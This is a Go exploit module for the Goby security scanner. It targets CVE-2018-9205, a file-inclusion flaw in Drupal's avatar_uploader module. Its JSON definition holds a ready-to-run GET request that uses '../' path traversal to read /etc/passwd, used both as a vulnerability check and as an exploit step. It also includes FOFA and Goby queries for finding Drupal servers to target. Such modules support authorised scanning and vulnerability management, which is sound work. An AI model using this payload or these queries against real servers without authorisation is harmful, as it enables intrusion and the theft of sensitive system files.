package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Drupal /sites/all/modules/avatar_uploader/lib/demo/view.php file file parameter file contains vulnerability (CVE-2018-9205)",
    "Description": "<p>avatar_uploader is a module in a content management system maintained by the Drupal community to implement the function of uploading user pictures.</p><p>attackers can manipulate file paths or names to trick the server into including unintended files, allowing them to execute malicious code or access sensitive files.</p>",
    "Impact": "<p>attackers can manipulate file paths or names to trick the server into including unintended files, allowing them to execute malicious code or access sensitive files.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.drupal.org/\">https://www.drupal.org/</a></p>",
    "Product": "Drupal",
    "VulType": [
        "File Inclusion"
    ],
    "Tags": [
        "File Inclusion"
    ],
    "Translation": {
        "CN": {
            "Name": "Drupal /sites/all/modules/avatar_uploader/lib/demo/view.php 文件 file 参数文件包含漏洞（CVE-2018-9205）",
            "Product": "Drupal",
            "Description": "<p>avatar_uploader是Drupal社区所维护的一套内容管理系统中的用于实现上传用户图片功能的模块。<br></p><p>攻击者可以通过构造恶意的文件路径或文件名，导致服务器在处理用户输入时，错误地将用户指定的文件内容包含到网页中，从而执行恶意代码或读取敏感文件。<br></p>",
            "Recommendation": "<p><a href=\"https://www.drupal.org/\">厂商已发布了漏洞修复程序，请及时关注更新：https://www.drupal.org/</a></p>",
            "Impact": "<p>攻击者可以通过构造恶意的文件路径或文件名，导致服务器在处理用户输入时，错误地将用户指定的文件内容包含到网页中，从而执行恶意代码或读取敏感文件。<br></p>",
            "VulType": [
                "文件包含"
            ],
            "Tags": [
                "文件包含"
            ]
        },
        "EN": {
            "Name": "Drupal /sites/all/modules/avatar_uploader/lib/demo/view.php file file parameter file contains vulnerability (CVE-2018-9205)",
            "Product": "Drupal",
            "Description": "<p>avatar_uploader is a module in a content management system maintained by the Drupal community to implement the function of uploading user pictures.<br></p><p>attackers can manipulate file paths or names to trick the server into including unintended files, allowing them to execute malicious code or access sensitive files.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.drupal.org/\">https://www.drupal.org/</a><br></p>",
            "Impact": "<p>attackers can manipulate file paths or names to trick the server into including unintended files, allowing them to execute malicious code or access sensitive files.<br></p>",
            "VulType": [
                "File Inclusion"
            ],
            "Tags": [
                "File Inclusion"
            ]
        }
    },
    "FofaQuery": "header=\"X-Generator: Drupal\" || body=\"content=\\\"Drupal\" || body=\"jQuery.extend(Drupal.settings\" || (body=\"/sites/default/files/\" && body=\"/sites/all/modules/\" && body=\"/sites/all/themes/\") || header=\"ace-drupal7prod\" || (banner=\"Location: /core/install.php\")",
    "GobyQuery": "header=\"X-Generator: Drupal\" || body=\"content=\\\"Drupal\" || body=\"jQuery.extend(Drupal.settings\" || (body=\"/sites/default/files/\" && body=\"/sites/all/modules/\" && body=\"/sites/all/themes/\") || header=\"ace-drupal7prod\" || (banner=\"Location: /core/install.php\")",
    "Author": "1209319263@qq.com",
    "Homepage": "https://www.drupal.org/",
    "DisclosureDate": "2022-03-26",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2018-08816"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2018-9205"
    ],
    "CNVD": [
        "CNVD-2018-08816"
    ],
    "CNNVD": [
        "CNNVD-201804-362"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "../../../../../../../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "7.5",
    "PocId": "10363"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
